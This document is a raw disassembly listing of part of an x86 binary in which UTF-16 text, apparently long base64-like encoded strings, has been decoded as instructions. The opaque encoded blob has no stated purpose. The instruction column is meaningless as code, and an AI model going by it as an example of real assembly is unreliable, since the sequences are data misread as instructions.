  40b45f:	00 69 00             	add    %ch,0x0(%ecx)
  40b462:	34 00                	xor    $0x0,%al
  40b464:	4f                   	dec    %edi
  40b465:	00 6b 00             	add    %ch,0x0(%ebx)
  40b468:	61                   	popa
  40b469:	00 6e 00             	add    %ch,0x0(%esi)
  40b46c:	61                   	popa
  40b46d:	00 57 00             	add    %dl,0x0(%edi)
  40b470:	4e                   	dec    %esi
  40b471:	00 66 00             	add    %ah,0x0(%esi)
  40b474:	37                   	aaa
  40b475:	00 78 00             	add    %bh,0x0(%eax)
  40b478:	6a 00                	push   $0x0
  40b47a:	53                   	push   %ebx
  40b47b:	00 6a 00             	add    %ch,0x0(%edx)
  40b47e:	58                   	pop    %eax
  40b47f:	00 42 00             	add    %al,0x0(%edx)
  40b482:	4b                   	dec    %ebx
  40b483:	00 48 00             	add    %cl,0x0(%eax)
  40b486:	35 00 77 00 32       	xor    $0x32007700,%eax
  40b48b:	00 52 00             	add    %dl,0x0(%edx)
  40b48e:	2f                   	das
  40b48f:	00 79 00             	add    %bh,0x0(%ecx)
  40b492:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40b496:	6a 00                	push   $0x0
  40b498:	71 00                	jno    0x40b49a
  40b49a:	75 00                	jne    0x40b49c
  40b49c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b49d:	00 45 00             	add    %al,0x0(%ebp)
  40b4a0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4a1:	00 37                	add    %dh,(%edi)
  40b4a3:	00 5a 00             	add    %bl,0x0(%edx)
  40b4a6:	46                   	inc    %esi
  40b4a7:	00 65 00             	add    %ah,0x0(%ebp)
  40b4aa:	6a 00                	push   $0x0
  40b4ac:	79 00                	jns    0x40b4ae
  40b4ae:	45                   	inc    %ebp
  40b4af:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4b2:	46                   	inc    %esi
  40b4b3:	00 69 00             	add    %ch,0x0(%ecx)
  40b4b6:	35 00 4b 00 4f       	xor    $0x4f004b00,%eax
  40b4bb:	00 75 00             	add    %dh,0x0(%ebp)
  40b4be:	2f                   	das
  40b4bf:	00 5a 00             	add    %bl,0x0(%edx)
  40b4c2:	75 00                	jne    0x40b4c4
  40b4c4:	5a                   	pop    %edx
  40b4c5:	00 61 00             	add    %ah,0x0(%ecx)
  40b4c8:	4e                   	dec    %esi
  40b4c9:	00 6a 00             	add    %ch,0x0(%edx)
  40b4cc:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4cd:	00 48 00             	add    %cl,0x0(%eax)
  40b4d0:	4b                   	dec    %ebx
  40b4d1:	00 53 00             	add    %dl,0x0(%ebx)
  40b4d4:	48                   	dec    %eax
  40b4d5:	00 6e 00             	add    %ch,0x0(%esi)
  40b4d8:	48                   	dec    %eax
  40b4d9:	00 37                	add    %dh,(%edi)
  40b4db:	00 39                	add    %bh,(%ecx)
  40b4dd:	00 58 00             	add    %bl,0x0(%eax)
  40b4e0:	70 00                	jo     0x40b4e2
  40b4e2:	35 00 4f 00 41       	xor    $0x41004f00,%eax
  40b4e7:	00 38                	add    %bh,(%eax)
  40b4e9:	00 4a 00             	add    %cl,0x0(%edx)
  40b4ec:	41                   	inc    %ecx
  40b4ed:	00 62 00             	add    %ah,0x0(%edx)
  40b4f0:	44                   	inc    %esp
  40b4f1:	00 46 00             	add    %al,0x0(%esi)
  40b4f4:	58                   	pop    %eax
  40b4f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4f8:	53                   	push   %ebx
  40b4f9:	00 4e 00             	add    %cl,0x0(%esi)
  40b4fc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4fd:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  40b501:	00 48 00             	add    %cl,0x0(%eax)
  40b504:	56                   	push   %esi
  40b505:	00 71 00             	add    %dh,0x0(%ecx)
  40b508:	7a 00                	jp     0x40b50a
  40b50a:	43                   	inc    %ebx
  40b50b:	00 2b                	add    %ch,(%ebx)
  40b50d:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40b511:	00 4b 00             	add    %cl,0x0(%ebx)
  40b514:	57                   	push   %edi
  40b515:	00 36                	add    %dh,(%esi)
  40b517:	00 59 00             	add    %bl,0x0(%ecx)
  40b51a:	70 00                	jo     0x40b51c
  40b51c:	44                   	inc    %esp
  40b51d:	00 49 00             	add    %cl,0x0(%ecx)
  40b520:	73 00                	jae    0x40b522
  40b522:	37                   	aaa
  40b523:	00 7a 00             	add    %bh,0x0(%edx)
  40b526:	73 00                	jae    0x40b528
  40b528:	36 00 30             	add    %dh,%ss:(%eax)
  40b52b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b52e:	4d                   	dec    %ebp
  40b52f:	00 65 00             	add    %ah,0x0(%ebp)
  40b532:	46                   	inc    %esi
  40b533:	00 45 00             	add    %al,0x0(%ebp)
  40b536:	78 00                	js     0x40b538
  40b538:	68 00 37 00 74       	push   $0x74003700
  40b53d:	00 6b 00             	add    %ch,0x0(%ebx)
  40b540:	38 00                	cmp    %al,(%eax)
  40b542:	37                   	aaa
  40b543:	00 6a 00             	add    %ch,0x0(%edx)
  40b546:	39 00                	cmp    %eax,(%eax)
  40b548:	30 00                	xor    %al,(%eax)
  40b54a:	2b 00                	sub    (%eax),%eax
  40b54c:	69 00 57 00 4b 00    	imul   $0x4b0057,(%eax),%eax
  40b552:	57                   	push   %edi
  40b553:	00 62 00             	add    %ah,0x0(%edx)
  40b556:	39 00                	cmp    %eax,(%eax)
  40b558:	71 00                	jno    0x40b55a
  40b55a:	63 00                	arpl   %eax,(%eax)
  40b55c:	74 00                	je     0x40b55e
  40b55e:	48                   	dec    %eax
  40b55f:	00 6b 00             	add    %ch,0x0(%ebx)
  40b562:	63 00                	arpl   %eax,(%eax)
  40b564:	30 00                	xor    %al,(%eax)
  40b566:	6e                   	outsb  %ds:(%esi),(%dx)
  40b567:	00 2b                	add    %ch,(%ebx)
  40b569:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40b56d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b570:	39 00                	cmp    %eax,(%eax)
  40b572:	70 00                	jo     0x40b574
  40b574:	69 00 48 00 44 00    	imul   $0x440048,(%eax),%eax
  40b57a:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40b57e:	37                   	aaa
  40b57f:	00 6f 00             	add    %ch,0x0(%edi)
  40b582:	6e                   	outsb  %ds:(%esi),(%dx)
  40b583:	00 71 00             	add    %dh,0x0(%ecx)
  40b586:	69 00 48 00 6f 00    	imul   $0x6f0048,(%eax),%eax
  40b58c:	62 00                	bound  %eax,(%eax)
  40b58e:	32 00                	xor    (%eax),%al
  40b590:	72 00                	jb     0x40b592
  40b592:	56                   	push   %esi
  40b593:	00 45 00             	add    %al,0x0(%ebp)
  40b596:	6f                   	outsl  %ds:(%esi),(%dx)
  40b597:	00 72 00             	add    %dh,0x0(%edx)
  40b59a:	73 00                	jae    0x40b59c
  40b59c:	52                   	push   %edx
  40b59d:	00 62 00             	add    %ah,0x0(%edx)
  40b5a0:	76 00                	jbe    0x40b5a2
  40b5a2:	79 00                	jns    0x40b5a4
  40b5a4:	70 00                	jo     0x40b5a6
  40b5a6:	47                   	inc    %edi
  40b5a7:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b5ab:	00 6a 00             	add    %ch,0x0(%edx)
  40b5ae:	6c                   	insb   (%dx),%es:(%edi)
  40b5af:	00 55 00             	add    %dl,0x0(%ebp)
  40b5b2:	6d                   	insl   (%dx),%es:(%edi)
  40b5b3:	00 45 00             	add    %al,0x0(%ebp)
  40b5b6:	57                   	push   %edi
  40b5b7:	00 52 00             	add    %dl,0x0(%edx)
  40b5ba:	78 00                	js     0x40b5bc
  40b5bc:	4c                   	dec    %esp
  40b5bd:	00 49 00             	add    %cl,0x0(%ecx)
  40b5c0:	47                   	inc    %edi
  40b5c1:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40b5c5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5c8:	4a                   	dec    %edx
  40b5c9:	00 6f 00             	add    %ch,0x0(%edi)
  40b5cc:	7a 00                	jp     0x40b5ce
  40b5ce:	41                   	inc    %ecx
  40b5cf:	00 59 00             	add    %bl,0x0(%ecx)
  40b5d2:	57                   	push   %edi
  40b5d3:	00 35 00 62 00 71    	add    %dh,0x71006200
  40b5d9:	00 30                	add    %dh,(%eax)
  40b5db:	00 70 00             	add    %dh,0x0(%eax)
  40b5de:	56                   	push   %esi
  40b5df:	00 31                	add    %dh,(%ecx)
  40b5e1:	00 45 00             	add    %al,0x0(%ebp)
  40b5e4:	46                   	inc    %esi
  40b5e5:	00 77 00             	add    %dh,0x0(%edi)
  40b5e8:	56                   	push   %esi
  40b5e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40b5ec:	34 00                	xor    $0x0,%al
  40b5ee:	74 00                	je     0x40b5f0
  40b5f0:	2b 00                	sub    (%eax),%eax
  40b5f2:	58                   	pop    %eax
  40b5f3:	00 55 00             	add    %dl,0x0(%ebp)
  40b5f6:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b5f9:	00 5a 00             	add    %bl,0x0(%edx)
  40b5fc:	5a                   	pop    %edx
  40b5fd:	00 66 00             	add    %ah,0x0(%esi)
  40b600:	52                   	push   %edx
  40b601:	00 4d 00             	add    %cl,0x0(%ebp)
  40b604:	46                   	inc    %esi
  40b605:	00 6b 00             	add    %ch,0x0(%ebx)
  40b608:	63 00                	arpl   %eax,(%eax)
  40b60a:	39 00                	cmp    %eax,(%eax)
  40b60c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b60d:	00 6f 00             	add    %ch,0x0(%edi)
  40b610:	71 00                	jno    0x40b612
  40b612:	6a 00                	push   $0x0
  40b614:	4f                   	dec    %edi
  40b615:	00 4e 00             	add    %cl,0x0(%esi)
  40b618:	68 00 45 00 6b       	push   $0x6b004500
  40b61d:	00 41 00             	add    %al,0x0(%ecx)
  40b620:	71 00                	jno    0x40b622
  40b622:	36 00 6c 00 6f       	add    %ch,%ss:0x6f(%eax,%eax,1)
  40b627:	00 5a 00             	add    %bl,0x0(%edx)
  40b62a:	61                   	popa
  40b62b:	00 47 00             	add    %al,0x0(%edi)
  40b62e:	45                   	inc    %ebp
  40b62f:	00 6e 00             	add    %ch,0x0(%esi)
  40b632:	79 00                	jns    0x40b634
  40b634:	32 00                	xor    (%eax),%al
  40b636:	65 00 38             	add    %bh,%gs:(%eax)
  40b639:	00 43 00             	add    %al,0x0(%ebx)
  40b63c:	41                   	inc    %ecx
  40b63d:	00 62 00             	add    %ah,0x0(%edx)
  40b640:	4d                   	dec    %ebp
  40b641:	00 2f                	add    %ch,(%edi)
  40b643:	00 47 00             	add    %al,0x0(%edi)
  40b646:	6e                   	outsb  %ds:(%esi),(%dx)
  40b647:	00 68 00             	add    %ch,0x0(%eax)
  40b64a:	33 00                	xor    (%eax),%eax
  40b64c:	32 00                	xor    (%eax),%al
  40b64e:	55                   	push   %ebp
  40b64f:	00 5a 00             	add    %bl,0x0(%edx)
  40b652:	78 00                	js     0x40b654
  40b654:	63 00                	arpl   %eax,(%eax)
  40b656:	69 00 31 00 4f 00    	imul   $0x4f0031,(%eax),%eax
  40b65c:	55                   	push   %ebp
  40b65d:	00 79 00             	add    %bh,0x0(%ecx)
  40b660:	30 00                	xor    %al,(%eax)
  40b662:	5a                   	pop    %edx
  40b663:	00 39                	add    %bh,(%ecx)
  40b665:	00 61 00             	add    %ah,0x0(%ecx)
  40b668:	6d                   	insl   (%dx),%es:(%edi)
  40b669:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b66c:	46                   	inc    %esi
  40b66d:	00 6a 00             	add    %ch,0x0(%edx)
  40b670:	62 00                	bound  %eax,(%eax)
  40b672:	35 00 53 00 68       	xor    $0x68005300,%eax
  40b677:	00 68 00             	add    %ch,0x0(%eax)
  40b67a:	71 00                	jno    0x40b67c
  40b67c:	73 00                	jae    0x40b67e
  40b67e:	59                   	pop    %ecx
  40b67f:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40b685:	68 00 34 00 78       	push   $0x78003400
  40b68a:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40b68e:	00 4f 00             	add    %cl,0x0(%edi)
  40b691:	53                   	push   %ebx
  40b692:	00 45 00             	add    %al,0x0(%ebp)
  40b695:	73 00                	jae    0x40b697
  40b697:	70 00                	jo     0x40b699
  40b699:	63 00                	arpl   %eax,(%eax)
  40b69b:	54                   	push   %esp
  40b69c:	00 33                	add    %dh,(%ebx)
  40b69e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b6a1:	56                   	push   %esi
  40b6a2:	00 59 00             	add    %bl,0x0(%ecx)
  40b6a5:	76 00                	jbe    0x40b6a7
  40b6a7:	76 00                	jbe    0x40b6a9
  40b6a9:	41                   	inc    %ecx
  40b6aa:	00 73 00             	add    %dh,0x0(%ebx)
  40b6ad:	6b 00 52             	imul   $0x52,(%eax),%eax
  40b6b0:	00 48 00             	add    %cl,0x0(%eax)
  40b6b3:	6d                   	insl   (%dx),%es:(%edi)
  40b6b4:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  40b6b8:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40b6bc:	00 31                	add    %dh,(%ecx)
  40b6be:	00 38                	add    %bh,(%eax)
  40b6c0:	00 2b                	add    %ch,(%ebx)
  40b6c2:	00 4d 00             	add    %cl,0x0(%ebp)
  40b6c5:	70 00                	jo     0x40b6c7
  40b6c7:	61                   	popa
  40b6c8:	00 43 00             	add    %al,0x0(%ebx)
  40b6cb:	62 00                	bound  %eax,(%eax)
  40b6cd:	71 00                	jno    0x40b6cf
  40b6cf:	32 00                	xor    (%eax),%al
  40b6d1:	57                   	push   %edi
  40b6d2:	00 53 00             	add    %dl,0x0(%ebx)
  40b6d5:	54                   	push   %esp
  40b6d6:	00 78 00             	add    %bh,0x0(%eax)
  40b6d9:	39 00                	cmp    %eax,(%eax)
  40b6db:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6dc:	00 37                	add    %dh,(%edi)
  40b6de:	00 43 00             	add    %al,0x0(%ebx)
  40b6e1:	54                   	push   %esp
  40b6e2:	00 4e 00             	add    %cl,0x0(%esi)
  40b6e5:	58                   	pop    %eax
  40b6e6:	00 43 00             	add    %al,0x0(%ebx)
  40b6e9:	4c                   	dec    %esp
  40b6ea:	00 68 00             	add    %ch,0x0(%eax)
  40b6ed:	35 00 72 00 45       	xor    $0x45007200,%eax
  40b6f2:	00 78 00             	add    %bh,0x0(%eax)
  40b6f5:	34 00                	xor    $0x0,%al
  40b6f7:	41                   	inc    %ecx
  40b6f8:	00 39                	add    %bh,(%ecx)
  40b6fa:	00 38                	add    %bh,(%eax)
  40b6fc:	00 42 00             	add    %al,0x0(%edx)
  40b6ff:	34 00                	xor    $0x0,%al
  40b701:	44                   	inc    %esp
  40b702:	00 4b 00             	add    %cl,0x0(%ebx)
  40b705:	79 00                	jns    0x40b707
  40b707:	57                   	push   %edi
  40b708:	00 67 00             	add    %ah,0x0(%edi)
  40b70b:	75 00                	jne    0x40b70d
  40b70d:	52                   	push   %edx
  40b70e:	00 48 00             	add    %cl,0x0(%eax)
  40b711:	72 00                	jb     0x40b713
  40b713:	35 00 49 00 52       	xor    $0x52004900,%eax
  40b718:	00 5a 00             	add    %bl,0x0(%edx)
  40b71b:	6d                   	insl   (%dx),%es:(%edi)
  40b71c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b71f:	6a 00                	push   $0x0
  40b721:	76 00                	jbe    0x40b723
  40b723:	61                   	popa
  40b724:	00 72 00             	add    %dh,0x0(%edx)
  40b727:	6d                   	insl   (%dx),%es:(%edi)
  40b728:	00 4a 00             	add    %cl,0x0(%edx)
  40b72b:	50                   	push   %eax
  40b72c:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40b730:	00 70 00             	add    %dh,0x0(%eax)
  40b733:	30 00                	xor    %al,(%eax)
  40b735:	4d                   	dec    %ebp
  40b736:	00 38                	add    %bh,(%eax)
  40b738:	00 33                	add    %dh,(%ebx)
  40b73a:	00 2b                	add    %ch,(%ebx)
  40b73c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b73f:	63 00                	arpl   %eax,(%eax)
  40b741:	6d                   	insl   (%dx),%es:(%edi)
  40b742:	00 61 00             	add    %ah,0x0(%ecx)
  40b745:	34 00                	xor    $0x0,%al
  40b747:	55                   	push   %ebp
  40b748:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40b74c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b74f:	6d                   	insl   (%dx),%es:(%edi)
  40b750:	00 63 00             	add    %ah,0x0(%ebx)
  40b753:	42                   	inc    %edx
  40b754:	00 69 00             	add    %ch,0x0(%ecx)
  40b757:	2f                   	das
  40b758:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  40b75c:	00 69 00             	add    %ch,0x0(%ecx)
  40b75f:	76 00                	jbe    0x40b761
  40b761:	50                   	push   %eax
  40b762:	00 4d 00             	add    %cl,0x0(%ebp)
  40b765:	48                   	dec    %eax
  40b766:	00 4b 00             	add    %cl,0x0(%ebx)
  40b769:	70 00                	jo     0x40b76b
  40b76b:	71 00                	jno    0x40b76d
  40b76d:	50                   	push   %eax
  40b76e:	00 5a 00             	add    %bl,0x0(%edx)
  40b771:	42                   	inc    %edx
  40b772:	00 38                	add    %bh,(%eax)
  40b774:	00 2f                	add    %ch,(%edi)
  40b776:	00 49 00             	add    %cl,0x0(%ecx)
  40b779:	33 00                	xor    (%eax),%eax
  40b77b:	62 00                	bound  %eax,(%eax)
  40b77d:	4a                   	dec    %edx
  40b77e:	00 47 00             	add    %al,0x0(%edi)
  40b781:	30 00                	xor    %al,(%eax)
  40b783:	77 00                	ja     0x40b785
  40b785:	6b 00 47             	imul   $0x47,(%eax),%eax
  40b788:	00 50 00             	add    %dl,0x0(%eax)
  40b78b:	7a 00                	jp     0x40b78d
  40b78d:	53                   	push   %ebx
  40b78e:	00 47 00             	add    %al,0x0(%edi)
  40b791:	67 00 6d 00          	add    %ch,0x0(%di)
  40b795:	49                   	dec    %ecx
  40b796:	00 45 00             	add    %al,0x0(%ebp)
  40b799:	4b                   	dec    %ebx
  40b79a:	00 48 00             	add    %cl,0x0(%eax)
  40b79d:	44                   	inc    %esp
  40b79e:	00 73 00             	add    %dh,0x0(%ebx)
  40b7a1:	4e                   	dec    %esi
  40b7a2:	00 4b 00             	add    %cl,0x0(%ebx)
  40b7a5:	6d                   	insl   (%dx),%es:(%edi)
  40b7a6:	00 6a 00             	add    %ch,0x0(%edx)
  40b7a9:	63 00                	arpl   %eax,(%eax)
  40b7ab:	31 00                	xor    %eax,(%eax)
  40b7ad:	58                   	pop    %eax
  40b7ae:	00 69 00             	add    %ch,0x0(%ecx)
  40b7b1:	2b 00                	sub    (%eax),%eax
  40b7b3:	59                   	pop    %ecx
  40b7b4:	00 6a 00             	add    %ch,0x0(%edx)
  40b7b7:	38 00                	cmp    %al,(%eax)
  40b7b9:	76 00                	jbe    0x40b7bb
  40b7bb:	5a                   	pop    %edx
  40b7bc:	00 79 00             	add    %bh,0x0(%ecx)
  40b7bf:	46                   	inc    %esi
  40b7c0:	00 46 00             	add    %al,0x0(%esi)
  40b7c3:	4a                   	dec    %edx
  40b7c4:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b7c8:	00 39                	add    %bh,(%ecx)
  40b7ca:	00 2b                	add    %ch,(%ebx)
  40b7cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b7cf:	4f                   	dec    %edi
  40b7d0:	00 4f 00             	add    %cl,0x0(%edi)
  40b7d3:	37                   	aaa
  40b7d4:	00 79 00             	add    %bh,0x0(%ecx)
  40b7d7:	45                   	inc    %ebp
  40b7d8:	00 69 00             	add    %ch,0x0(%ecx)
  40b7db:	69 00 64 00 63 00    	imul   $0x630064,(%eax),%eax
  40b7e1:	53                   	push   %ebx
  40b7e2:	00 2b                	add    %ch,(%ebx)
  40b7e4:	00 4d 00             	add    %cl,0x0(%ebp)
  40b7e7:	4c                   	dec    %esp
  40b7e8:	00 52 00             	add    %dl,0x0(%edx)
  40b7eb:	4e                   	dec    %esi
  40b7ec:	00 75 00             	add    %dh,0x0(%ebp)
  40b7ef:	6b 00 41             	imul   $0x41,(%eax),%eax
  40b7f2:	00 6f 00             	add    %ch,0x0(%edi)
  40b7f5:	75 00                	jne    0x40b7f7
  40b7f7:	58                   	pop    %eax
  40b7f8:	00 7a 00             	add    %bh,0x0(%edx)
  40b7fb:	54                   	push   %esp
  40b7fc:	00 6a 00             	add    %ch,0x0(%edx)
  40b7ff:	4d                   	dec    %ebp
  40b800:	00 6f 00             	add    %ch,0x0(%edi)
  40b803:	5a                   	pop    %edx
  40b804:	00 4d 00             	add    %cl,0x0(%ebp)
  40b807:	6c                   	insb   (%dx),%es:(%edi)
  40b808:	00 69 00             	add    %ch,0x0(%ecx)
  40b80b:	70 00                	jo     0x40b80d
  40b80d:	61                   	popa
  40b80e:	00 2b                	add    %ch,(%ebx)
  40b810:	00 38                	add    %bh,(%eax)
  40b812:	00 48 00             	add    %cl,0x0(%eax)
  40b815:	4d                   	dec    %ebp
  40b816:	00 78 00             	add    %bh,0x0(%eax)
  40b819:	78 00                	js     0x40b81b
  40b81b:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b81f:	55                   	push   %ebp
  40b820:	00 4a 00             	add    %cl,0x0(%edx)
  40b823:	66 00 30             	data16 add %dh,(%eax)
  40b826:	00 55 00             	add    %dl,0x0(%ebp)
  40b829:	58                   	pop    %eax
  40b82a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b82d:	64 00 34 00          	add    %dh,%fs:(%eax,%eax,1)
  40b831:	49                   	dec    %ecx
  40b832:	00 4d 00             	add    %cl,0x0(%ebp)
  40b835:	4a                   	dec    %edx
  40b836:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40b83a:	00 59 00             	add    %bl,0x0(%ecx)
  40b83d:	4b                   	dec    %ebx
  40b83e:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  40b842:	00 72 00             	add    %dh,0x0(%edx)
  40b845:	6a 00                	push   $0x0
  40b847:	6e                   	outsb  %ds:(%esi),(%dx)
  40b848:	00 48 00             	add    %cl,0x0(%eax)
  40b84b:	58                   	pop    %eax
  40b84c:	00 32                	add    %dh,(%edx)
  40b84e:	00 56 00             	add    %dl,0x0(%esi)
  40b851:	69 00 6d 00 43 00    	imul   $0x43006d,(%eax),%eax
  40b857:	49                   	dec    %ecx
  40b858:	00 77 00             	add    %dh,0x0(%edi)
  40b85b:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40b85f:	74 00                	je     0x40b861
  40b861:	58                   	pop    %eax
  40b862:	00 71 00             	add    %dh,0x0(%ecx)
  40b865:	52                   	push   %edx
  40b866:	00 61 00             	add    %ah,0x0(%ecx)
  40b869:	75 00                	jne    0x40b86b
  40b86b:	62 00                	bound  %eax,(%eax)
  40b86d:	42                   	inc    %edx
  40b86e:	00 77 00             	add    %dh,0x0(%edi)
  40b871:	44                   	inc    %esp
  40b872:	00 70 00             	add    %dh,0x0(%eax)
  40b875:	6d                   	insl   (%dx),%es:(%edi)
  40b876:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40b87a:	00 72 00             	add    %dh,0x0(%edx)
  40b87d:	59                   	pop    %ecx
  40b87e:	00 47 00             	add    %al,0x0(%edi)
  40b881:	57                   	push   %edi
  40b882:	00 56 00             	add    %dl,0x0(%esi)
  40b885:	39 00                	cmp    %eax,(%eax)
  40b887:	45                   	inc    %ebp
  40b888:	00 57 00             	add    %dl,0x0(%edi)
  40b88b:	46                   	inc    %esi
  40b88c:	00 53 00             	add    %dl,0x0(%ebx)
  40b88f:	35 00 4a 00 4e       	xor    $0x4e004a00,%eax
  40b894:	00 78 00             	add    %bh,0x0(%eax)
  40b897:	59                   	pop    %ecx
  40b898:	00 76 00             	add    %dh,0x0(%esi)
  40b89b:	71 00                	jno    0x40b89d
  40b89d:	75 00                	jne    0x40b89f
  40b89f:	69 00 33 00 35 00    	imul   $0x350033,(%eax),%eax
  40b8a5:	50                   	push   %eax
  40b8a6:	00 76 00             	add    %dh,0x0(%esi)
  40b8a9:	76 00                	jbe    0x40b8ab
  40b8ab:	6b 00 35             	imul   $0x35,(%eax),%eax
  40b8ae:	00 37                	add    %dh,(%edi)
  40b8b0:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40b8b4:	00 54 00 33          	add    %dl,0x33(%eax,%eax,1)
  40b8b8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b8bb:	53                   	push   %ebx
  40b8bc:	00 43 00             	add    %al,0x0(%ebx)
  40b8bf:	56                   	push   %esi
  40b8c0:	00 73 00             	add    %dh,0x0(%ebx)
  40b8c3:	37                   	aaa
  40b8c4:	00 68 00             	add    %ch,0x0(%eax)
  40b8c7:	30 00                	xor    %al,(%eax)
  40b8c9:	50                   	push   %eax
  40b8ca:	00 38                	add    %bh,(%eax)
  40b8cc:	00 39                	add    %bh,(%ecx)
  40b8ce:	00 2f                	add    %ch,(%edi)
  40b8d0:	00 36                	add    %dh,(%esi)
  40b8d2:	00 4f 00             	add    %cl,0x0(%edi)
  40b8d5:	41                   	inc    %ecx
  40b8d6:	00 70 00             	add    %dh,0x0(%eax)
  40b8d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8da:	00 36                	add    %dh,(%esi)
  40b8dc:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40b8e0:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8e3:	31 00                	xor    %eax,(%eax)
  40b8e5:	71 00                	jno    0x40b8e7
  40b8e7:	74 00                	je     0x40b8e9
  40b8e9:	4e                   	dec    %esi
  40b8ea:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  40b8ee:	00 42 00             	add    %al,0x0(%edx)
  40b8f1:	31 00                	xor    %eax,(%eax)
  40b8f3:	50                   	push   %eax
  40b8f4:	00 56 00             	add    %dl,0x0(%esi)
  40b8f7:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40b8fb:	54                   	push   %esp
  40b8fc:	00 42 00             	add    %al,0x0(%edx)
  40b8ff:	41                   	inc    %ecx
  40b900:	00 78 00             	add    %bh,0x0(%eax)
  40b903:	4c                   	dec    %esp
  40b904:	00 35 00 31 00 6d    	add    %dh,0x6d003100
  40b90a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b90d:	69 00 78 00 75 00    	imul   $0x750078,(%eax),%eax
  40b913:	59                   	pop    %ecx
  40b914:	00 6a 00             	add    %ch,0x0(%edx)
  40b917:	7a 00                	jp     0x40b919
  40b919:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40b91d:	73 00                	jae    0x40b91f
  40b91f:	70 00                	jo     0x40b921
  40b921:	76 00                	jbe    0x40b923
  40b923:	42                   	inc    %edx
  40b924:	00 66 00             	add    %ah,0x0(%esi)
  40b927:	34 00                	xor    $0x0,%al
  40b929:	32 00                	xor    (%eax),%al
  40b92b:	52                   	push   %edx
  40b92c:	00 32                	add    %dh,(%edx)
  40b92e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b931:	73 00                	jae    0x40b933
  40b933:	38 00                	cmp    %al,(%eax)
  40b935:	31 00                	xor    %eax,(%eax)
  40b937:	6e                   	outsb  %ds:(%esi),(%dx)
  40b938:	00 72 00             	add    %dh,0x0(%edx)
  40b93b:	75 00                	jne    0x40b93d
  40b93d:	77 00                	ja     0x40b93f
  40b93f:	72 00                	jb     0x40b941
  40b941:	30 00                	xor    %al,(%eax)
  40b943:	75 00                	jne    0x40b945
  40b945:	62 00                	bound  %eax,(%eax)
  40b947:	75 00                	jne    0x40b949
  40b949:	53                   	push   %ebx
  40b94a:	00 43 00             	add    %al,0x0(%ebx)
  40b94d:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b950:	00 6e 00             	add    %ch,0x0(%esi)
  40b953:	73 00                	jae    0x40b955
  40b955:	67 00 65 00          	add    %ah,0x0(%di)
  40b959:	77 00                	ja     0x40b95b
  40b95b:	49                   	dec    %ecx
  40b95c:	00 6e 00             	add    %ch,0x0(%esi)
  40b95f:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40b962:	00 71 00             	add    %dh,0x0(%ecx)
  40b965:	46                   	inc    %esi
  40b966:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40b96a:	00 67 00             	add    %ah,0x0(%edi)
  40b96d:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40b970:	00 39                	add    %bh,(%ecx)
  40b972:	00 36                	add    %dh,(%esi)
  40b974:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b978:	00 33                	add    %dh,(%ebx)
  40b97a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b97d:	47                   	inc    %edi
  40b97e:	00 5a 00             	add    %bl,0x0(%edx)
  40b981:	6b 00 78             	imul   $0x78,(%eax),%eax
  40b984:	00 48 00             	add    %cl,0x0(%eax)
  40b987:	4f                   	dec    %edi
  40b988:	00 72 00             	add    %dh,0x0(%edx)
  40b98b:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b98f:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40b993:	44                   	inc    %esp
  40b994:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b997:	59                   	pop    %ecx
  40b998:	00 55 00             	add    %dl,0x0(%ebp)
  40b99b:	48                   	dec    %eax
